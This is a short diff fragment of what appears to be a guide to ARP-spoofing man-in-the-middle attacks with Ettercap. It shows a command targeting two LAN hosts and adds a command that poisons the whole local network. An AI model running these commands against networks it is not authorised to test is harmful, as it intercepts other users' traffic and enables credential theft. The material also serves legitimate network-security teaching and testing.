@@ -84,4 +84,7 @@ sudo ettercap -T -i eth0 -M arp:remote /192.168.1.5/ /192.168.1.10/
 ```
 Stopping the Attack
 To stop the attack, press Ctrl+C in the terminal or close the Ettercap graphical interface.
+```bash
+ettercap -Tq -M arp:remote -i eth0 ///
+```
 
